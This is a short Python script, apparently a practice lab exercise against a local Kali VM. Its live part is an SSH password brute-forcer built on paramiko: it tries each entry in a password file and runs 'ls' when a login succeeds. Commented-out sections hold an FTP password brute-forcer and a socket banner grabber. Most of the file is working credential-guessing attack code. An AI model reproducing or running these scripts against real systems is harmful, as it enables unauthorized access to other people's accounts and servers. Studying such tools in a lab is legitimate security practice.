# import socket
#
# target = input('Enter ip for banner grabbing: ')
# port = input('Enter port for banner grabbing: ')
# port = int(port)
# try:
#     mysocket = socket.socket()
#
#     mysocket.connect((target, port))
#
#     mysocket.send('do you have service?\r\n'.encode())
#
#     mysocket.settimeout(5)
#
#     myrecv = mysocket.recv(2048).decode()
#
#     print(myrecv)
#
#     mysocket.close()
# except Exception as e:
#
#     print(e)

# import ftplib
#
# target = input('Enter IP address: ')
# port = 21
# server = ftplib.FTP()
# username = 'kali'
#
# myfile = open('passwords.txt', 'r')
#
#
# for line in myfile:
#         password = line.replace('\n', '')
#         print(f'im trying the password {password}')
#
#         try:
#             server.connect(target, port, timeout=10)
#             x = server.login(username, password)
#             if '230' in x:
#                 print(f'the password is {password}')
#                 break
#
#         except Exception as e:
#             print(e)
#             continue

import paramiko

myssh = paramiko.SSHClient()

myssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

myssh.load_system_host_keys()

ip = '192.168.56.103'
port = 4444
username = 'kali'

mfile = open('passwords.txt')
for line in mfile:
    password = line.replace('\n', '')
    print(f'im trying the password {password}')
    try:
        x = myssh.connect(ip, port, username, password)
        if 'failed' != x:
            stdin, stdout, strerr = myssh.exec_command('ls')
            print(f'the password is {password}')
            myssh.close()
            break
    except Exception as e:
        print(e)


print('Bye bye')

